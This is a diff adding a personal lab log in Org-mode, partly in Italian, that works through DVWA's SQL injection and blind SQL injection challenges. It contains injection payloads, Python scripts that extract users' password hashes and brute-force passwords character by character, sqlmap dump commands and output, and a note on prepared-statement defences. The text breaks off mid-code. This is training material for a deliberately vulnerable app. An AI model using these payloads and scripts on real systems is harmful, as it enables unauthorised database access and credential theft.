@@ -1,0 +1,1126 @@
+#+TITLE: DVWA Log
+#+AUTHOR: Leonardo Tamiano
+
+* General
+  To download docker image
+  #+begin_src sh
+docker pull vulnerables/web-dvwa
+  #+end_src
+
+  To launch docker iamge
+  #+begin_src sh
+docker run --name dvwa --rm -d -it -p 80:80 vulnerables/web-dvwa
+  #+end_src
+
+  To execute the various scripts do
+  #+begin_src sh
+export PYTHONPATH=.
+  #+end_src
+  
+** Manual installation
+   Scaricare: https://dvwa.co.uk/
+
+   #+begin_src sh
+curl https://codeload.github.com/digininja/DVWA/zip/master --output ~/Downloads/DVWA-master
+cd ~/Downloads
+unzip DVWA-master.zip
+mv DVWA-master dvwa
+cp dvwa
+sudo cp -r dvwa /var/www/html
+sudo service apache2 start
+cd /var/www/html/dvwa
+cp config/config.inc.php.dist config/config.inc.php
+   #+end_src
+
+   Setting up permissions
+   #+begin_src sh
+sudo chmod 777 hackable/uploads
+sudo chmod 777 config/
+chmod 666 /var/www/html/dvwa/external/phpids/0.6/lib/IDS/tmp/phpids_log.txt
+   #+end_src
+
+   Change php.ini variables
+   #+begin_src sh
+sudo find / -name "php.ini" 2> /dev/null
+nano /etc/php/7.3/apache2/php.ini 
+   #+end_src
+  
+   Reset db
+   #+begin_src sh
+sudo service mariadb stop
+sudo rm -r /var/lib/mysql/
+sudo mysql_install_db
+sudo service mariadb start
+mysql -u root -p  # then press enter
+
+create database dvwa;
+create user dvwa@localhost identified by 'p@ssw0rd';
+grant all on dvwa.* to dvwa@localhost;
+flush privileges;
+exit
+   #+end_src
+  
+* DONE 01 – SQL Injection
+  
+** DONE Easy
+
+   - [[https://www.youtube.com/watch?v=DuhkzqA8Lmg][DVWA – SQL Injections | easy (ITA)]]
+   - [[https://www.youtube.com/watch?v=03e-zx97GM8][DVWA – Automatizzare le SQL Injections con Python | easy (ITA)]]
+   
+*** Payload
+    #+begin_example
+' OR 1=1 #   
+    #+end_example
+
+    #+begin_example
+' UNION SELECT first_name, password FROM users #    
+    #+end_example
+
+*** Code
+    #+begin_src python
+#!/usr/bin/env python3
+
+"""This file contains a simply script that can be used to automate the
+exploitation of the SQL injection challenge (easy level) offered by
+the Damn Vulnerable Web Application (DVWA) support.
+"""
+
+import requests
+import urllib3
+from bs4 import BeautifulSoup
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning())
+
+PROXIES = {
+    "http": "http://127.0.0.1:8080",
+    "https": "https://127.0.0.1:8080"
+}
+
+URL="http://localhost/dvwa/vulnerabilities/sqli/"
+
+CUSTOM_HEADERS = { "Cookie": "security=low; PHPSESSID=9odllamdr98h4b7mk9gsaue7lj" }
+
+PAYLOADS = [
+    "' OR 1=1 # ",
+    "'",
+    "' UNION SELECT first_name, password FROM users # ",
+]
+
+# -----------------------
+
+def exploit_sqli(payload):
+    params = {"id": payload, "Submit": "Submit"}
+    r = requests.get(URL, params=params, headers=CUSTOM_HEADERS)
+    soup = BeautifulSoup(r.text, "html.parser")
+    div = soup.find("div", {"class": "vulnerable_code_area"})
+
+    if not div:
+        print(f"[ERROR]: {r.text}")
+        print("==================================")
+        print(f"   payload = `{payload}`")
+        print(f"   error_msg = `{r.text}`")
+        return []
+
+    return div.find_all("pre")
+
+def main():
+    print()
+    for payload in PAYLOADS:
+        results = exploit_sqli(payload)
+
+        if len(results) > 0:
+            print(f"[SUCCESS]: Found {len(results)} records!")
+            print("==================================")
+            print(f"   payload = `{payload}`")
+
+            # -- iterate over all results
+            for res in results:
+                l = res.decode_contents().split("<br/>")
+                print(f"   {l[1]}, {l[2]}")
+
+        print()
+
+# -----------------------
+
+if __name__ == "__main__":
+    main()
+    #+end_src
+
+** DONE Medium
+   [2022-07-23 Sat 18:10]
+
+   - [[https://www.youtube.com/watch?v=Z0tZHoUnsEE][DVWA – SQL Injections | medium (ITA)]]
+
+*** Payload
+    #+begin_example
+   1 OR 1=1 #
+  #+end_example
+
+    #+begin_example
+   1 UNION SELECT first_name, password FROM users #
+    #+end_example
+   
+*** Walkthrough
+    La richiesta HTTP effettuata è la seguente
+
+    #+begin_example
+POST /dvwa/vulnerabilities/sqli/ HTTP/1.1
+Host: evil.com
+Content-Length: 18
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://evil.com
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://evil.com/dvwa/vulnerabilities/sqli/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Cookie: security=medium; PHPSESSID=cha7rsj468ggoua24i1pp32k81
+Connection: close
+
+id=1&Submit=Submit   
+
+    #+end_example
+
+    Anche se il codice html prova a rinforzare il controllo sul
+    valore dell'ID, facendo in modo che L'ID possa essere solamente
+    un valore tra 1 e 5.
+   
+    #+begin_src html
+<form action="#" method="POST">
+  <p>
+    User ID:
+    <select name="id">
+      <option value="1">1</option>
+      <option value="2">2</option>
+      <option value="3">3</option>
+      <option value="4">4</option>
+      <option value="5">5</option>
+    </select>
+    <input type="submit" name="Submit" value="Submit">
+  </p>
+  
+</form>   
+    #+end_src
+
+    Andando a manipolare direttamente la richiesta POST e cambiando il
+    valore di ~id~ in un valore a nostra scelta, bypassiamo ogni
+    controllo. Se mettiamo il payload
+
+    #+begin_example
+   id=1+1&Submit=Submit
+    #+end_example
+
+    otteniamo il seguente errore SQL
+
+    #+begin_example
+<pre>You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '1' at line 1</pre>   
+    #+end_example
+
+    La presenza di questo errore è un possibile sintomo del fatto che
+    l'input dell'utente è utilizzato direttamente e senza sanificazioni
+    per costruire la query che viene poi eseguita sul database. Queste
+    potrebbe portare ad una SQL injection.
+
+    --------
+
+    Il payload di interesse per ottenere una sqli è quindi il seguente
+   
+    #+begin_example
+   1 OR 1=1 #
+    #+end_example
+   
+    se poi siamo interessati a tutte le password, possiamo utilizzare
+    quest'altro payload
+   
+    #+begin_example
+   1 UNION SELECT first_name, password FROM users #
+    #+end_example
+
+    Che ci ritorna la seguente risposta
+
+    #+begin_src html
+<pre>ID: 1 UNION SELECT first_name, password FROM users # <br />First name: admin <br />Surname: admin</pre>
+<pre>ID: 1 UNION SELECT first_name, password FROM users #<br />First name: admin<br />Surname: 5f4dcc3b5aa765d61d8327deb882cf99</pre>
+<pre>ID: 1 UNION SELECT first_name, password FROM users #<br />First name: Gordon<br />Surname: e99a18c428cb38d5f260853678922e03</pre>
+<pre>ID: 1 UNION SELECT first_name, password FROM users #<br />First name: Hack<br />Surname: 8d3533d75ae2c3966d7e0d4fcc69216b</pre>
+<pre>ID: 1 UNION SELECT first_name, password FROM users #<br />First name: Pablo<br />Surname: 0d107d09f5bbe40cade3de5c71e9e9b7</pre>
+<pre>ID: 1 UNION SELECT first_name, password FROM users #<br />First name: Bob<br />Surname: 5f4dcc3b5aa765d61d8327deb882cf99</pre>
+    #+end_src
+   
+    --------
+      
+    #+begin_example
+POST /dvwa/vulnerabilities/sqli/ HTTP/1.1
+Host: evil.com
+Content-Length: 65
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://evil.com
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://evil.com/dvwa/vulnerabilities/sqli/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Cookie: security=medium; PHPSESSID=cha7rsj468ggoua24i1pp32k81
+Connection: close
+
+id=1 UNION SELECT first_name, password FROM users #&Submit=Submit      
+    #+end_example
+
+** DONE Hard
+
+   - [[https://www.youtube.com/watch?v=CceHyxdYvT4][DVWA – SQL Injections | hard (ITA)]]
+   
+*** Payload
+    #+begin_example
+1' UNION ALL SELECT NULL,1
+    #+end_example
+
+*** Walkthrough
+    Prima di effettuare il livello hard vediamo come utilizzare ~sqlmap~
+    nel livello ~easy~. A tale fine attiviamo il proxy e catturiamo la
+    richiesta che viene effettuata
+
+    ----------------
+   
+    #+begin_example
+GET /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit HTTP/1.1
+Host: evil.com
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://evil.com/dvwa/vulnerabilities/sqli/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Cookie: security=low; PHPSESSID=l1vgsbhkufl414bik8iifrc91m
+Connection: close
+    #+end_example
+
+    ----------------
+  
+    Tramite burp la possiamo salvare in un file con (tasto destro ->
+    save item) e possiamo poi chiamare ~sqlmap~ come segue
+
+    #+begin_src sh
+sqlmap -r sql_easy_request.xml    
+    #+end_src
+
+    Dopo un po' di tempo, otteniamo il seguente output
+
+    ----------------
+
+    #+begin_example
+sqlmap identified the following injection point(s) with a total of 154 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
+    Payload: id=1' OR NOT 9464=9464#&Submit=Submit
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=1' AND (SELECT 8635 FROM(SELECT COUNT(*),CONCAT(0x7178707671,(SELECT (ELT(8635=8635,1))),0x7170707a71,FLOOR(RAND(0)*2))x FROMS GROUP BY x)a)-- ZnFP&Submit=Submit
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=1' AND (SELECT 8713 FROM (SELECT(SLEEP(5)))WCBw)-- mmPl&Submit=Submit
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 2 columns
+    Payload: id=1' UNION ALL SELECT NULL,CONCAT(0x7178707671,0x4c594d43454244515472616c757677727a4350434f6744785952544d6d59666f535379456f7361ubmit   
+    #+end_example
+
+    ----------------
+  
+    Se poi vogliamo estrapolare tutti i dati di interesse, possiamo
+    effettuare il seguente comando
+
+    #+begin_src sh
+sqlmap -r sql_easy_request.xml --dump   
+    #+end_src
+   
+    otteniamo quindi le seguenti due tabelle
+
+    ----------------
+
+    #+begin_example
+Database: dvwa
+Table: users
+[5 entries]
++---------+---------+----------------------------------+----------------------------------+-----------+------------+---------------------+--------------+
+| user_id | user    | avatar                           | password                         | last_name | first_name | last_login          | failed_login |
++---------+---------+----------------------------------+----------------------------------+-----------+------------+---------------------+--------------+
+| 1       | admin   | /dvwa/hackable/users/admin.jpg   | 5f4dcc3b5aa765d61d8327deb882cf99 | admin     | admin      | 2022-07-23 17:52:48 | 0            |
+| 2       | gordonb | /dvwa/hackable/users/gordonb.jpg | e99a18c428cb38d5f260853678922e03 | Brown     | Gordon     | 2022-07-23 17:52:48 | 0            |
+| 3       | 1337    | /dvwa/hackable/users/1337.jpg    | 8d3533d75ae2c3966d7e0d4fcc69216b | Me        | Hack       | 2022-07-23 17:52:48 | 0            |
+| 4       | pablo   | /dvwa/hackable/users/pablo.jpg   | 0d107d09f5bbe40cade3de5c71e9e9b7 | Picasso   | Pablo      | 2022-07-23 17:52:48 | 0            |
+| 5       | smithy  | /dvwa/hackable/users/smithy.jpg  | 5f4dcc3b5aa765d61d8327deb882cf99 | Smith     | Bob        | 2022-07-23 17:52:48 | 0            |
++---------+---------+----------------------------------+----------------------------------+-----------+------------+---------------------+--------------+
+
+Database: dvwa
+Table: guestbook
+[1 entry]
++------------+------+-------------------------+
+| comment_id | name | comment                 |
++------------+------+-------------------------+
+| 1          | test | This is a test comment. |
++------------+------+-------------------------+   
+
+    #+end_example
+
+    ----------------
+  
+    Nel livello ~hard~ però sqlmap non sembra più funzionare, in quanto
+    se catturiamo la richiesta all'endpoint ~session-input.php~ otteniamo
+    il seguente risultato
+   
+    #+begin_example
+POST /dvwa/vulnerabilities/sqli/session-input.php HTTP/1.1
+Host: evil.com
+Content-Length: 18
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://evil.com
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://evil.com/dvwa/vulnerabilities/sqli/session-input.php
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Cookie: security=high; PHPSESSID=l1vgsbhkufl414bik8iifrc91m
+Connection: close
+
+id=1&Submit=Submit   
+    #+end_example
+   
+    #+begin_src sh
+sqlmap -r sql_high_request.xml   
+    #+end_src
+
+    #+begin_example
+[16:01:30] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'- you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option itch '--random-agent'   
+    #+end_example
+
+    Il problema è che questo tipo di injection è una sql injection con
+    una ~second-order response~, nel senso che l'output associati al
+    payload non è mostrato direttamente ma bisogna effettuare una
+    seconda richiesta ad un altro endpoint.
+   
+    #+begin_example
+payload con sqli ---> endpoint #1 ---> cambio stato interno + output inutile
+richiesta        ---> endpoint #2 ---> output del payload di prima
+    #+end_example
+
+    In questo casi possiamo utilizzare la flag ~--second-url~ offerta da ~sqlmap~
+
+    #+begin_src sh
+sqlmap -r sql_high_request.xml --second-url=http://evil.com/dvwa/vulnerabilities/sqli/index.php    
+    #+end_src
+
+    Così facendo otteniamo nuovamente che il parametro ~id~ è vulnerabile
+    ad una sqli
+   
+    #+begin_example
+POST parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 63 HTTP(s) requests:
+---
+Parameter: id (POST)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=1' AND (SELECT 2900 FROM (SELECT(SLEEP(5)))dCcN) AND 'TAXB'='TAXB&Submit=Submit
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 2 columns
+    Payload: id=1' UNION ALL SELECT NULL,CONCAT(0x716b627671,0x68726c704c457854584679595a574967416d6d526a7761717659
+t=Submit
+---   
+    #+end_example
+
+    E riusciamo a dumpare le informazioni del db come abbiamo fatto
+    precedentemente.
+    
+*** Extra: PHP session variables
+    #+begin_src php
+$_SESSION[ 'id' ] =  $_POST[ 'id' ]; # scrivere variabile di sessione
+# ...
+$id = $_SESSION[ 'id' ];             # scrivere variabile di sessione
+    #+end_src
+
+    Nel file ~/etc/php/7.3/apache2/php.ini~ è presente l'entry
+    ~session.save_path~ che punta al path ~/var/lib/php/sessions~. In
+    questa cartella sono salvati una serie di file
+   
+    #+begin_example
+root@kali:/var/lib/php/sessions# ls
+sess_omegr89sf6f8t3jmkj9s7aqr5o   
+    #+end_example
+
+    e il formato di questi file è sempre ~sess_<COOKIE_ID>~. Il contenuto
+    di questo file contiene una struttura dati php serializzata, e
+    questa struttura dati contiene tutte le variabili di sessione
+   
+    #+begin_example
+root@kali:/var/lib/php/sessions# cat sess_omegr89sf6f8t3jmkj9s7aqr5o
+dvwa|a:2:{s:8:"messages";a:0:{}s:8:"username";s:5:"admin";}id|s:1:"3";session_token|s:32:"81a6949061570eabafcf23194d58a628";   
+    #+end_example
+
+    Notiamo che è presente anche il valore del campo ~id~. Modificando
+    quel valore siamo in grado di cambiare l'output nella relativa
+    pagina dell'applicazione.
+    
+** DONE Impossible
+
+   - [[https://www.youtube.com/watch?v=IPyJHHCXt20][DVWA – SQL Injections | impossible (ITA)]]
+     
+*** notes
+    Livello impossible di DVWA caratterizzato dall'uso di PREPARED STATEMENTS
+
+    #+begin_src php
+$data = $db->prepare('SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;');
+$data->bindParam(':id', $id, PDO::PARAM_INT);
+$data->execute();
+$row = $data->fetch();
+    #+end_src
+
+    L'idea è quella di SEPARARE i dati dal codice, e infatti nel codice
+    delle prepared statement stiamo dicendo, in CODICE, che id deve
+    essere un DATO di tipo int (PDO::PARAM_INT).
+
+    Un altro modo, meno robusto, è quello di fare escaping
+
+    #+begin_src php
+$escaped_id = mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $id);
+$query = "SELECT first_name, last_name FROM users WHERE user_id = '{$escaped_id}' LIMIT 1;"
+    #+end_src
+  
+    Questo secondo metodo è meno robusto per via dell'encoding. L'escape
+    viene fatto a livello dell'encoding, e quindi dobbiamo stare attenti
+    a qual è l'encoding the il server si aspetta di ricevere.
+
+    (vedere UNICODE htb per problemi legati all'encoding dei caratteri)
+
+    -------------------
+
+    Detto questo, anche se ci sono questi due metodi per rendere il
+    codice più sicuro, quando siamo di fronte al codice, e basta, cosa
+    possiamo veramente dire?
+
+    Possiamo dire che il codice è sicuro?
+
+    In realtà no, perché tipicamente non abbiamo la visione dell'intero
+    AMBIENTE in cui quel CODICE viene eseguito. Vediamo solo una piccola
+    parte, la parte relativa al CODICE appunto, e questo crea potenziali
+    problemi.
+
+    L'idea è che un CODICE dovrà comunque essere eseguito all'interno di
+    un AMBIENTE DI ESECUZIONE, e la sicurezza non è una proprietà
+    statica solo del codice, ma anche del modo in cui viene eseguito,
+    ovvero dipende sia dal CODICE che dall'AMBIENTE DI ESECUZIONE.
+  
+    Quindi, quello che possiamo dire sicuramente è che il codice è stato
+    scritto rispettato gli standard di sicurezza per il relativo
+    contesto, in questo caso il contesto di come proteggerci da una SQL
+    injection. La sicurezza del sistema sarà poi determinata anche da
+    tutti gli altri fattori, tra cui, per menzionarne qualcuno:
+
+    1. Come è implementata la libreria dei prepared statements o
+       dell'escaping?
+
+    2. Come è implementato l'interprete PHP che esegue il codice?
+
+    3. Come è implementato il web server che riceve ed invia i messaggi
+       HTTP?
+
+    4. Come è implementato il kernel che legge il pacchetto dalla scheda
+       di rete e la invia al web server?
+  
+    5. Come è implementata la scheda di rete che riceve i dati dal cavo?
+     
+* DOING 02 – SQL Injection (Blind)
+** DONE Low
+
+   - [[https://www.youtube.com/watch?v=GTol6pnDMsw][DVWA – Blind SQL Injections | easy (ITA)]]
+   
+*** Payload
+    To force TRUE condition
+    #+begin_example
+1' AND 1=1 # 
+    #+end_example
+
+    To force FALSE condition
+    #+begin_example
+1' AND 1=0 #  
+    #+end_example
+
+**** Q1: check tables
+     If returns TRUE, then table exists, otherwise it does not.    
+     #+begin_example
+1' AND (select 'x' from users LIMIT 1) = 'x' #
+1' AND (select 'x' from guestbook LIMIT 1) = 'x' #   
+     #+end_example
+
+     In general
+     #+begin_example
+1' AND (select 'x' from <TABLE> LIMIT 1) = 'x' # 
+     #+end_example
+
+**** Q2: users in users table
+     #+begin_example
+1' AND (select 'x' from users where first_name='<USER>' LIMIT 1) = 'x' #
+     #+end_example
+
+     To verify ~admin~ user in table ~users~
+
+     #+begin_example
+1' AND (select 'x' from users where first_name='admin' LIMIT 1) = 'x' #      
+     #+end_example
+
+     To verify ~asd~ user in table ~users~
+
+     #+begin_example
+1' AND (select 'x' from users where first_name='asd' LIMIT 1) = 'x' #
+     #+end_example
+
+**** Q3: check password length of user admin
+
+     Check if password is greater than ~i~
+     #+begin_example
+1' AND (select 'x' from users where first_name='admin' and LENGTH(password) > i LIMIT 1) = 'x' #
+     #+end_example
+
+     We send a series of queries
+     #+begin_example
+1' AND (select 'x' from users where first_name='admin' and LENGTH(password) > 1 LIMIT 1) = 'x' #
+1' AND (select 'x' from users where first_name='admin' and LENGTH(password) > 2 LIMIT 1) = 'x' #
+1' AND (select 'x' from users where first_name='admin' and LENGTH(password) > 3 LIMIT 1) = 'x' #
+1' AND (select 'x' from users where first_name='admin' and LENGTH(password) > 4 LIMIT 1) = 'x' #
+1' AND (select 'x' from users where first_name='admin' and LENGTH(password) > 5 LIMIT 1) = 'x' #
+1' AND (select 'x' from users where first_name='admin' and LENGTH(password) > 6 LIMIT 1) = 'x' #
+1' AND (select 'x' from users where first_name='admin' and LENGTH(password) > 7 LIMIT 1) = 'x' #
+...
+1' AND (select 'x' from users where first_name='admin' and LENGTH(password) > 30 LIMIT 1) = 'x' #
+1' AND (select 'x' from users where first_name='admin' and LENGTH(password) > 31 LIMIT 1) = 'x' #
+1' AND (select 'x' from users where first_name='admin' and LENGTH(password) > 32 LIMIT 1) = 'x' #     
+     #+end_example
+
+     until we find the one that fails, and at that point the length is the previous one.
+     
+**** Q4: obtain admin password in users tables
+
+     #+begin_example
+1' AND (select 'x' from users where first_name='admin' and substring(password, i, 1) = <c> LIMIT 1) = 'x' #
+     #+end_example
+
+     #+begin_example
+1' AND (select 'x' from users where first_name='admin' and substring(password, 1, 1) = '5' LIMIT 1) = 'x' #
+1' AND (select 'x' from users where first_name='admin' and substring(password, 2, 1) = 'f' LIMIT 1) = 'x' #
+     #+end_example
+     
+*** Code
+
+    #+begin_src python
+#!/usr/bin/env python3
+
+import requests
+
+URL = "http://evil.com/dvwa/vulnerabilities/sqli_blind/"
+
+CUSTOM_HEADERS = {
+    "Cookie": "security=low; PHPSESSID=e8hut8pjnkk4ps2b42bce1ubrl"
+}
+
+MAX_PASSWORD_LENGTH = 1024
+ALPHABET = "-_" + "0123456789" + "abcdefghijklmnopqrstuvwxyz" + "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
+
+def get_password_length(username):
+    global URL, CUSTOM_HEADERS, MAX_PASSWORD_LENGTH
+    for i in range(1, MAX_PASSWORD_LENGTH):
+        sqli_payload = f"1' AND (select 'x' from users where first_name='{username}' and LENGTH(password) > {i} LIMIT 1) = 'x' # "
+        params = {"id": sqli_payload, "Submit": "Submit" }
+        r = requests.get(URL, params=params, headers=CUSTOM_HEADERS)
+        if "MISSING" in r.text:
+            return i
+
+def get_password(username):
+    global URL, CUSTOM_HEADERS, ALPHABET 
+    
+    password_length = get_password_length(username)
+    password = ""
+    print(f"[{username}]: La lunghezza della password è {password_length}")
+
+    for i in range(1, password_length + 1):
+        for c in ALPHABET:
+            sqli_payload = f"1' AND (select 'x' from users where first_name='{username}' and substring(password, {i}, 1) = '{c}' LIMIT 1) = 'x' # "
+            params = {"id": sqli_payload, "Submit": "Submit" }
+            r = requests.get(URL, params=params, headers=CUSTOM_HEADERS)
+            if "exists" in r.text:
+                password = password + c
+                print(c, end="", flush=True)
+                break
+    print()
+    return password
+
+if __name__ == "__main__":
+    users = ["admin", "Bob", "Pablo", "Gordon"]
+    for user in users:
+        password = get_password(user)
+        print(f"L'utente {user} ha la password: {password}")    
+    #+end_src
+    
+** DONE Medium
+
+   - [[https://www.youtube.com/watch?v=gg6qA-tWyXc][DVWA – Blind SQL Injections | medium (ITA)]]
+
+*** Payload
+    To obtain TRUE condition
+    #+begin_example
+ '1 AND 1=1 # '
+    #+end_example
+
+    To obtain FALSE condition
+    #+begin_example
+'1 AND 1=0 # '  
+    #+end_example
+
+    Since we cannot use ~'~ we have to encode everything using integers as follows
+
+    #+begin_example
+first_name='admin' <---> substring(first_name, 1, 1) = CHAR(97) AND
+		   	 substring(first_name, 2, 1) = CHAR(100) AND 
+			 substring(first_name, 3, 1) = CHAR(109) AND
+			 substring(first_name, 4, 1) = CHAR(105) AND
+			 substring(first_name, 5, 1) = CHAR(110)
+    #+end_example
+
+    We obtain the query
+
+    #+begin_example
+    '1 AND (select 1 from users where substring(first_name, 1, 1) = CHAR(97) AND substring(first_name, 2, 1) = CHAR(100) AND substring(first_name, 3, 1) = CHAR(109) AND substring(first_name, 4, 1) = CHAR(105) AND substring(first_name, 5, 1) = CHAR(110) LIMIT 1) = 1 # '
+    #+end_example
+    
+*** Code
+    #+begin_src python
+#!/usr/bin/env python3
+
+import requests
+import urllib3
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning())
+
+URL = "http://localhost/dvwa/vulnerabilities/sqli_blind/"
+custom_headers = {
+    "Content-Type": "application/x-www-form-urlencoded",
+    "Cookie": "security=medium; PHPSESSID=3tsk837kk0j907arne8jhunh0l"
+}
+proxies = {
+    "http": "http://127.0.0.1:8080",
+    "https": "https://127.0.0.1:8080",    
+}
+
+def encode_sql_condition(user):
+    sql = ""
+    for i, c in enumerate(user):
+        sql += f"substring(first_name, {i+1}, 1) = CHAR({ord(c)}) AND "
+    return sql[:-5]
+
+def get_password_length(user):
+    MAX_LENGTH = 100
+    username_sql = encode_sql_condition(user)
+
+    for i in range(1, MAX_LENGTH):
+        sql_payload = f"1 AND (select 1 from users where {username_sql} and LENGTH(password) > {i}) = 1 #"
+        data = f"id={sql_payload}&Submit=Submit"
+        r = requests.post(URL, data=data, headers=custom_headers, proxies=proxies)
+
+        if "MISSING" in r.text:
+            return i
+
+def get_password(user):
+    password_length = get_password_length(user)
+    username_sql_code = encode_sql_condition(user)
+
+    ALPHABET = ""
+    ALPHABET += "0123456789"
+    ALPHABET += "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
+    ALPHABET += "abcdefghijklmnopqrstuvwxyz"
+
+    password = ""
+    for i in range(1, password_length + 1):
+        for c in ALPHABET:
+            sql_payload = f"1 AND (select substring(password, {i}, 1) from users where {username_sql_code}) = CHAR({ord(c)}) #"
+            data = f"id={sql_payload}&Submit=Submit"
+            r = requests.post(URL, data=data, headers=custom_headers, proxies=proxies)
+
+            if not "MISSING" in r.text:
+                password += c
+                print(c, end="", flush=True)
+                break
+            
+    return password
+
+if __name__ == "__main__":
+    users = ["admin", "Gordon", "Hack", "Pablo", "Bob"]
+
+    for user in users:
+        password = get_password(user)
+        print()
+        print(f"La password di {user} è {password}")
+    #+end_src
+
+** TODO High
+   [2023-11-01 mer 20:43]
+
+   The challenge is that when we click on "here to change your ID", a
+   new window is spawned, in this window we can put the value, and the
+   original page changes with our output
+
+   - User ID exists
+   - User ID is MISSING
+
+   We should analyze the http protocol of these messages to understand
+   what is going on.
+
+*** HTTP Analysis
+    What happens at the HTTP layer is as follows:
+
+    - Initially you go to the initial page you see nothing
+
+      #+begin_example
+GET /vulnerabilities/sqli_blind/ HTTP/1.1
+Host: evil
+      #+end_example
+
+    - Then you click on the "here to change your ID", and a new page opens up, which is
+
+      #+begin_example
+GET /vulnerabilities/sqli_blind/cookie-input.php HTTP/1.1
+Host: evil
+      #+end_example
+
+    - Then you submit your input to this page
+
+      #+begin_example
+POST /vulnerabilities/sqli_blind/cookie-input.php HTTP/1.1
+Host: evil
+Content-Length: 18
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://evil
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://evil/vulnerabilities/sqli_blind/cookie-input.php
+Accept-Encoding: gzip, deflate, br
+Accept-Language: it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7
+Cookie: id=0; PHPSESSID=ois1bv5ekkrsaoj4ir6h1g6p62; security=high
+Connection: close
+
+id=1&Submit=Submit
+      #+end_example
+
+      When the server responds you back, notice the ~Set-Cookie~ header
+
+      #+begin_example
+HTTP/1.1 200 OK
+Date: Wed, 01 Nov 2023 19:59:48 GMT
+Server: Apache/2.4.25 (Debian)
+Expires: Tue, 23 Jun 2009 12:00:00 GMT
+Cache-Control: no-cache, must-revalidate
+Pragma: no-cache
+Set-Cookie: id=1
+Vary: Accept-Encoding
+Content-Length: 890
+Connection: close
+Content-Type: text/html;charset=utf-8
+      #+end_example
+
+    - When we go pack to the original page, the value is taken from the cookie
+
+      #+begin_example
+GET /vulnerabilities/sqli_blind/ HTTP/1.1
+Host: evil
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://evil/vulnerabilities/sqli_blind/
+Accept-Encoding: gzip, deflate, br
+Accept-Language: it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7
+Cookie: id=1; PHPSESSID=ois1bv5ekkrsaoj4ir6h1g6p62; security=high
+Connection: close
+      #+end_example
+   
+*** Code Review
+    The previous analysis was confirmed by reviewing the code
+
+    #+begin_src php
+<?php
+
+if( isset( $_COOKIE[ 'id' ] ) ) {
+    // Get input
+    $id = $_COOKIE[ 'id' ];
+
+    // Check database
+    $getid  = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;";
+    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $getid ); // Removed 'or die' to suppress mysql errors
+
+    // Get results
+    $num = @mysqli_num_rows( $result ); // The '@' character suppresses errors
+    if( $num > 0 ) {
+        // Feedback for end user
+        echo '<pre>User ID exists in the database.</pre>';
+    }
+    else {
+        // Might sleep a random amount
